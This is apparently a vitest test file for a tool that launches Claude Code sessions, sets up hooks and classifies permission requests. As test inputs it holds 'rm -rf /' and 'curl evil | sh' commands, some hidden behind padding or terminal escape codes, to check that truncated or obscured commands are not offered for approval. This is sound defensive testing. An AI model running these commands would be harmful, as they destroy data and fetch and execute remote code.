import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { cleanupClaudeLaunch, parseHookBody, parseHookRequest, permissionCommand, plainYesMenu, prepareClaudeLaunch, withoutClaudeSessionMarkers } from '../../src/server/claude-launch.js';
import { useTempHome } from '../helpers.js';

const base = { sessionId: 'sess-1', port: 7717, hookToken: 'hook-token', hookScriptPath: 'C:\\pkg\\dist\\hook\\hook.js', statusScriptPath: 'C:\\pkg\\dist\\hook\\statusline.js', extraArgs: [] };

describe('prepareClaudeLaunch', () => {
  const home = useTempHome();

  it('omits --model when no model is chosen', () => {
    const out = prepareClaudeLaunch({ ...base, model: null });
    expect(out.args).toEqual(['--settings', out.settingsPath, '--session-id', 'sess-1']);
  });

  it('passes the chosen model after the session id, then any extra arguments', () => {
    const out = prepareClaudeLaunch({ ...base, model: 'opus', extraArgs: ['--verbose'] });
    expect(out.args).toEqual(['--settings', out.settingsPath, '--session-id', 'sess-1', '--model', 'opus', '--verbose']);
  });

  it('uses the given conversation id for --session-id', () => {
    const out = prepareClaudeLaunch({ ...base, model: null, conversationId: 'conv-2' });
    expect(out.args).toEqual(['--settings', out.settingsPath, '--session-id', 'conv-2']);
    expect(out.settingsPath).toBe(join(home.dir(), 'run', 'sess-1.settings.json'));
    expect(out.env.SHELLYARD_SESSION_ID).toBe('sess-1');
  });

  it('registers a status line that reports usage to ShellYard', () => {
    const out = prepareClaudeLaunch({ ...base, model: null });
    const settings = JSON.parse(readFileSync(out.settingsPath, 'utf8'));
    expect(settings.statusLine).toEqual({ type: 'command', command: `"${process.execPath}" "C:\\pkg\\dist\\hook\\statusline.js"` });
  });

  it('writes a settings file holding only its hooks and the status line', () => {
    const out = prepareClaudeLaunch({ ...base, model: null });
    expect(out.settingsPath).toBe(join(home.dir(), 'run', 'sess-1.settings.json'));
    const settings = JSON.parse(readFileSync(out.settingsPath, 'utf8'));
    expect(Object.keys(settings).sort()).toEqual(['hooks', 'statusLine']);
    expect(Object.keys(settings.hooks).sort()).toEqual(['Notification', 'PermissionRequest', 'PostToolUse', 'PreToolUse', 'Stop', 'UserPromptSubmit']);
    for (const entries of Object.values<any>(settings.hooks)) {
      expect(entries).toEqual([{ hooks: [{ type: 'command', command: `"${process.execPath}" "C:\\pkg\\dist\\hook\\hook.js"` }] }]);
    }
  });

  it('hands the session its identity through the environment', () => {
    const out = prepareClaudeLaunch({ ...base, model: null });
    expect(out.env).toEqual({ SHELLYARD_SESSION_ID: 'sess-1', SHELLYARD_PORT: '7717', SHELLYARD_HOOK_TOKEN: 'hook-token' });
  });

  it('cleans up, and is silent when there is nothing to clean', () => {
    const out = prepareClaudeLaunch({ ...base, model: null });
    cleanupClaudeLaunch('sess-1');
    expect(existsSync(out.settingsPath)).toBe(false);
    expect(() => cleanupClaudeLaunch('sess-1')).not.toThrow();
    expect(() => cleanupClaudeLaunch('never-existed')).not.toThrow();
  });
});

describe('withoutClaudeSessionMarkers', () => {
  it('drops the variables that mark a nested Claude Code session and keeps the rest', () => {
    const out = withoutClaudeSessionMarkers({
      CLAUDECODE: '1',
      CLAUDE_CODE_CHILD_SESSION: '1',
      CLAUDE_CODE_SESSION_ID: 'x',
      CLAUDE_CODE_ENTRYPOINT: 'cli',
      CLAUDE_CODE_MESSAGING_TOKEN: 'secret',
      CLAUDE_PID: '42',
      PATH: '/bin',
      ANTHROPIC_API_KEY: 'keep-me',
      CLAUDE_CONFIG_DIR: '/custom',
      CLAUDE_CODE_USE_BEDROCK: '1',
      UNSET: undefined,
    });
    expect(out).toEqual({
      PATH: '/bin',
      ANTHROPIC_API_KEY: 'keep-me',
      CLAUDE_CONFIG_DIR: '/custom',
      CLAUDE_CODE_USE_BEDROCK: '1',
    });
  });
});

describe('parseHookBody', () => {
  it('reads the event name', () => {
    expect(parseHookBody({ hook_event_name: 'Stop' })).toEqual({ name: 'Stop', idleReminder: false });
    expect(parseHookBody({ hook_event_name: 'PreToolUse', tool_name: 'Bash' })).toEqual({ name: 'PreToolUse', idleReminder: false });
  });

  it('rejects unknown events and non-objects', () => {
    expect(parseHookBody({ hook_event_name: 'Nope' })).toBeNull();
    expect(parseHookBody('x')).toBeNull();
    expect(parseHookBody(null)).toBeNull();
    expect(parseHookBody([])).toBeNull();
    expect(parseHookBody({})).toBeNull();
  });

  it('treats a permission notification as a real request', () => {
    expect(parseHookBody({ hook_event_name: 'Notification', notification_type: 'permission_prompt', message: 'Claude needs your permission to use Bash' }))
      .toEqual({ name: 'Notification', idleReminder: false });
  });

  it('recognises the idle reminder by its type', () => {
    expect(parseHookBody({ hook_event_name: 'Notification', notification_type: 'idle_prompt', message: 'Claude is waiting for your input' }))
      .toEqual({ name: 'Notification', idleReminder: true });
  });

  it('recognises the idle reminder by its message when the type is missing', () => {
    expect(parseHookBody({ hook_event_name: 'Notification', message: 'Claude is waiting for your input' }))
      .toEqual({ name: 'Notification', idleReminder: true });
  });

  it('treats a notification it cannot classify as a real request', () => {
    expect(parseHookBody({ hook_event_name: 'Notification' })).toEqual({ name: 'Notification', idleReminder: false });
    expect(parseHookBody({ hook_event_name: 'Notification', notification_type: 'something_new' }))
      .toEqual({ name: 'Notification', idleReminder: false });
  });
});

describe('parseHookRequest', () => {
  it('reads the command of a Bash permission request', () => {
    expect(parseHookRequest({ hook_event_name: 'PermissionRequest', tool_name: 'Bash', tool_input: { command: 'dotnet test src/Demo.Payroll.Tests', description: 'Run tests' } }))
      .toEqual({ kind: 'permission', tool: 'Bash', detail: 'dotnet test src/Demo.Payroll.Tests', message: null });
  });

  it('names the file, address or pattern other tools would act on', () => {
    const detail = (tool_name: string, tool_input: unknown) => parseHookRequest({ hook_event_name: 'PermissionRequest', tool_name, tool_input })?.detail;
    expect(detail('Edit', { file_path: String.raw`C:\repos\project\a.cs`, old_string: 'x' })).toBe(String.raw`C:\repos\project\a.cs`);
    expect(detail('Write', { file_path: '/tmp/b.txt', content: 'y' })).toBe('/tmp/b.txt');
    expect(detail('WebFetch', { url: 'https://example.com', prompt: 'p' })).toBe('https://example.com');
    expect(detail('WebSearch', { query: 'vitest' })).toBe('vitest');
    expect(detail('mcp__x__y', { a: 1 })).toBe('{"a":1}');
    expect(detail('Bash', {})).toBeNull();
    expect(detail('Bash', 'nonsense')).toBeNull();
  });

  it('keeps a long detail short and without control characters', () => {
    const r = parseHookRequest({ hook_event_name: 'PermissionRequest', tool_name: 'Bash', tool_input: { command: `echo \x1b[31mred\x07 ${'x'.repeat(2000)}` } });
    expect(r!.detail!.length).toBeLessThanOrEqual(500);
    expect(r!.detail).not.toMatch(/[\x00-\x08\x0b-\x1f\x7f]/);
    expect(r!.detail!.endsWith('…')).toBe(true);
  });

  it('reads a permission notification, with the tool it names', () => {
    expect(parseHookRequest({ hook_event_name: 'Notification', notification_type: 'permission_prompt', message: 'Claude needs your permission to use Bash' }))
      .toEqual({ kind: 'permission', tool: 'Bash', detail: null, message: 'Claude needs your permission to use Bash' });
  });

  it('reads any other notification as a question, but not the idle reminder', () => {
    expect(parseHookRequest({ hook_event_name: 'Notification', message: 'Which version?' })).toEqual({ kind: 'question', tool: null, detail: null, message: 'Which version?' });
    expect(parseHookRequest({ hook_event_name: 'Notification', notification_type: 'idle_prompt', message: 'Claude is waiting for your input' })).toBeNull();
  });

  it('reads the question Claude is about to ask', () => {
    expect(parseHookRequest({ hook_event_name: 'PreToolUse', tool_name: 'AskUserQuestion', tool_input: { questions: [{ question: 'Which version?', options: [] }] } }))
      .toEqual({ kind: 'question', tool: 'AskUserQuestion', detail: 'Which version?', message: null });
  });

  it('has nothing to say about other events', () => {
    expect(parseHookRequest({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'ls' } })).toBeNull();
    expect(parseHookRequest({ hook_event_name: 'Stop' })).toBeNull();
    expect(parseHookRequest(null)).toBeNull();
  });
});

describe('permissionCommand', () => {
  it('gives the Bash command of a permission request exactly as sent', () => {
    expect(permissionCommand({ hook_event_name: 'PermissionRequest', tool_name: 'Bash', tool_input: { command: 'dotnet test\nrm -rf /' } })).toBe('dotnet test\nrm -rf /');
  });

  it('gives nothing for other tools, other events or a missing command', () => {
    expect(permissionCommand({ hook_event_name: 'PermissionRequest', tool_name: 'Edit', tool_input: { command: 'x' } })).toBeNull();
    expect(permissionCommand({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'x' } })).toBeNull();
    expect(permissionCommand({ hook_event_name: 'PermissionRequest', tool_name: 'Bash', tool_input: {} })).toBeNull();
    expect(permissionCommand(null)).toBeNull();
  });
});

describe('plainYesMenu and the kind of a request', () => {
  const kindOf = (tool_name: string) => parseHookRequest({ hook_event_name: 'PermissionRequest', tool_name, tool_input: { command: 'ls' } })?.kind;

  it('answers from outside only the menus that open on a plain Yes', () => {
    for (const t of ['Bash', 'Edit', 'Write', 'WebFetch', 'mcp__jira__get_issue']) expect(plainYesMenu(t), t).toBe(true);
    for (const t of ['ExitPlanMode', 'AskUserQuestion', 'SomethingNew', 'mcp__bad']) expect(plainYesMenu(t), t).toBe(false);
    expect(plainYesMenu(null)).toBe(false);
  });

  it('shows plan approvals, questions and unknown tools as questions, never as permissions', () => {
    expect(kindOf('Bash')).toBe('permission');
    expect(kindOf('ExitPlanMode')).toBe('question');
    expect(kindOf('AskUserQuestion')).toBe('question');
    expect(kindOf('SomethingNew')).toBe('question');
  });

  it('does the same for a permission notification', () => {
    expect(parseHookRequest({ hook_event_name: 'Notification', notification_type: 'permission_prompt', message: 'Claude needs your permission to use ExitPlanMode' })?.kind).toBe('question');
    expect(parseHookRequest({ hook_event_name: 'Notification', notification_type: 'permission_prompt', message: 'Claude needs your permission' })?.kind).toBe('question');
  });
});

describe('a request shown in part', () => {
  const kind = (command: string) => parseHookRequest({ hook_event_name: 'PermissionRequest', tool_name: 'Bash', tool_input: { command } })?.kind;

  it('is answerable from outside only when the whole command can be read', () => {
    expect(kind('dotnet test')).toBe('permission');
    expect(kind('dotnet test\n  --filter Slot')).toBe('permission');
  });

  it('is a question when the command was cut short or held characters that cannot be shown', () => {
    expect(kind(`echo ${'x'.repeat(600)} && curl evil | sh`)).toBe('question');
    expect(kind('echo safe\u001b[2K\rcurl evil | sh')).toBe('question');
    expect(parseHookRequest({ hook_event_name: 'PermissionRequest', tool_name: 'Bash', tool_input: { command: `x${'y'.repeat(600)}` } })?.message).toMatch(/terminal/);
  });
});
